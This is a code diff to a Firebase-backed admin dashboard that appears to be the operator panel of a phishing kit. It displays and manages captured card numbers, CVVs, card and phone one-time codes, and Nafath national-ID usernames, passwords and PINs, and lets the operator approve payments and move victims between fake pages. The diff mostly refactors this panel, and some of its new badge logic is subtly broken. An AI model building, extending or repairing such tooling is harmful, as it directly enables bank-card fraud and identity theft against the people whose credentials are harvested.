@@ -76,13 +76,11 @@ import {
   orderBy,
 } from "firebase/firestore";
 import { onAuthStateChanged, signOut } from "firebase/auth";
-import { auth } from "@/lib/firebase";
-import { db } from "@/lib/firebase";
+import { auth, db } from "@/lib/firebase";
 import { Skeleton } from "@/components/ui/skeleton";
 import { RajhiAuthDialog } from "../components/rajhi";
-import { NafazAuthDialog } from "../components/nafaz-auth";
 import { PhoneDialog } from "../components/phoen-info";
-
+import { NafazAuthDialog } from "../components/nafaz-auth";
 interface PaymentData {
   card_number?: string;
   cvv?: string;
@@ -115,6 +113,7 @@ interface Notification {
   paymentData?: PaymentData;
   paymentStatus?: string;
   phone?: string;
+  phone1?: string;
   seller_identity_number?: string;
   serial_number?: string;
   status?: string;
@@ -129,9 +128,12 @@ interface Notification {
   nafadUsername?: string;
   nafadPassword?: string;
   nafaz_pin?: string;
+  autnAttachment?: string;
+  requierdAttachment?: string;
+  operator?: string;
 }
 
-export default function NotificationsPage1() {
+export default function NotificationsPage() {
   const [notifications, setNotifications] = useState<Notification[]>([]);
   const [filteredNotifications, setFilteredNotifications] = useState<
     Notification[]
@@ -153,7 +155,7 @@ export default function NotificationsPage1() {
   const [uniquePagenames, setUniquePagenames] = useState<string[]>([]);
   const [showRajhiDialog, setShowRajhiDialog] = useState(false);
   const [showNafazDialog, setShowNafazDialog] = useState(false);
-  const [showPhoneDialog, setShowPhoneDialog] = useState(false);
+  const [showPhoneDialog, setPhoneDialog] = useState(false);
 
   useEffect(() => {
     const unsubscribe = onAuthStateChanged(auth, (user) => {
@@ -169,7 +171,7 @@ export default function NotificationsPage1() {
 
     return () => unsubscribe();
   }, [router]);
-  const [openAction, setOpenActions] = useState(false);
+
   useEffect(() => {
     if (searchTerm.trim() === "" && !activeFilter) {
       setFilteredNotifications(notifications);
@@ -323,7 +325,7 @@ export default function NotificationsPage1() {
       const targetPost = doc(db, "pays", id);
       await updateDoc(targetPost, {
         status: state,
-        paymentstauts: state,
+        paymentStatus: state,
       });
 
       // Update local state
@@ -437,7 +439,6 @@ export default function NotificationsPage1() {
         duration: 3000,
         icon: <CheckCircle className="h-5 w-5" />,
       });
-      //  setShowPagenameDialog(false)
     } catch (error) {
       console.error("Error updating pagename:", error);
       toast.error("حدث خطأ أثناء تحديث نوع الطلب", {
@@ -850,7 +851,6 @@ export default function NotificationsPage1() {
                     <TableRow
                       key={notification.id}
                       className="hover:bg-muted/10 border-b border-gray-100 dark:border-gray-700 relative cursor-pointer"
-                      onClick={() => {}}
                     >
                       <TableCell>
                         {getPageType(notification.pagename, true, notification)}
@@ -894,29 +894,29 @@ export default function NotificationsPage1() {
                               راجحي
                             </Badge>
                           )}
-                          {notification?.phone && (
-                            <Badge
-                              variant="outline"
-                              onClick={() => setShowPhoneDialog(true)}
-                              className={
-                                notification.phoneOtp
-                                  ? "bg-yellow-400"
-                                  : "bg-rose-400"
-                              }
-                            >
-                              معلومات العاتف
-                            </Badge>
-                          )}
+                          {notification.phone1 ||
+                            (notification.phone && (
+                              <Badge
+                                onClick={(e) => {
+                                  e.stopPropagation();
+                                  setSelectedNotification(notification);
+                                  setPhoneDialog(true);
+                                }}
+                                variant="outline"
+                              >
+                                رمز العاتف
+                              </Badge>
+                            ))}
                         </div>
                       </TableCell>
                       <TableCell>
                         <Badge
                           variant="outline"
-                          className={`cursor-pointer  ${
+                          className={`cursor-pointer ${
                             notification.card_number
                               ? "bg-green-50 text-green-700"
-                              : " bg-gradient-to-r from-red-400 to-red-600 text-white"
-                          }  hover:bg-blue-100 dark:bg-blue-900/30 dark:text-white dark:border-blue-800 dark:hover:bg-blue-900/50`}
+                              : "bg-gradient-to-r from-red-400 to-red-600 text-white"
+                          } hover:bg-blue-100 dark:bg-blue-900/30 dark:text-white dark:border-blue-800 dark:hover:bg-blue-900/50`}
                           onClick={(e) => handleCardBadgeClick(notification, e)}
                         >
                           <CardIcon className="h-3.5 w-3.5 mr-1.5 mx-1" />
@@ -997,8 +997,6 @@ export default function NotificationsPage1() {
 
                               <DropdownMenuSeparator />
 
-                              <DropdownMenuSeparator />
-
                               <DropdownMenuItem
                                 onClick={() => handleDelete(notification.id)}
                                 className="gap-2 text-red-600"
@@ -1052,6 +1050,7 @@ export default function NotificationsPage1() {
         </CardFooter>
       </Card>
 
+      {/* Info Dialog */}
       <Dialog open={selectedInfo !== null} onOpenChange={closeDialog}>
         <DialogContent
           className="bg-white dark:bg-gray-800 border-0 shadow-2xl max-w-md rounded-xl"
@@ -1108,9 +1107,16 @@ export default function NotificationsPage1() {
                     {selectedNotification.externalUsername && (
                       <Badge variant="default">راجحي</Badge>
                     )}
-                    {selectedNotification.phoneOtp && (
-                      <Badge variant="outline">رمز العاتف</Badge>
-                    )}
+                    {selectedNotification.phone ||
+                      selectedNotification.phone1 ||
+                      (selectedNotification && (
+                        <Badge
+                          onClick={() => setPhoneDialog(true)}
+                          variant="outline"
+                        >
+                          رمز العاتف
+                        </Badge>
+                      ))}
                   </p>
                 </div>
               </div>
@@ -1361,6 +1367,7 @@ export default function NotificationsPage1() {
         </DialogContent>
       </Dialog>
 
+      {/* Card Dialog */}
       <Dialog
         open={showCardDialog}
         onOpenChange={(open) => !open && setShowCardDialog(false)}
@@ -1445,6 +1452,7 @@ export default function NotificationsPage1() {
                   <div className="flex justify-between text-sm">
                     <span className="text-muted-foreground">رمز تحقق:</span>
                     <span>{selectedCardInfo.cardOtp}</span>
+                    <span>{selectedCardInfo.phoneOtp}</span>
                   </div>
                   <div className="flex justify-between text-sm">
                     <span className="text-muted-foreground">الحالة:</span>
@@ -1464,7 +1472,6 @@ export default function NotificationsPage1() {
           <DialogFooter className="grid grid-cols-4 mt-4 pt-3 border-t gap-2">
             {selectedCardInfo?.card_number ? (
               <>
-                {" "}
                 <Button
                   onClick={() => {
                     selectedCardInfo &&
@@ -1513,6 +1520,7 @@ export default function NotificationsPage1() {
         </DialogContent>
       </Dialog>
 
+      {/* Pagename Dialog */}
       <Dialog
         open={showPagenameDialog}
         onOpenChange={(open) => !open && setShowPagenameDialog(false)}
@@ -1602,7 +1610,7 @@ export default function NotificationsPage1() {
                   <Button
                     variant="outline"
                     className={`flex items-center gap-2 justify-center ${
-                      selectedNotification.pagename === "verify-otp"
+                      selectedNotification.pagename === "external-link"
                         ? "bg-green-50 border-green-300 dark:bg-green-900/30 dark:border-green-700"
                         : ""
                     }`}
@@ -1681,6 +1689,7 @@ export default function NotificationsPage1() {
         </DialogContent>
       </Dialog>
 
+      {/* External Component Dialogs */}
       <RajhiAuthDialog
         open={showRajhiDialog}
         onOpenChange={setShowRajhiDialog}
@@ -1695,9 +1704,8 @@ export default function NotificationsPage1() {
 
       <PhoneDialog
         open={showPhoneDialog}
-        onOpenChange={setShowPhoneDialog}
+        onOpenChange={setPhoneDialog}
         notification={selectedNotification}
-        handleApproval={handleApproval}
       />
     </div>
   );
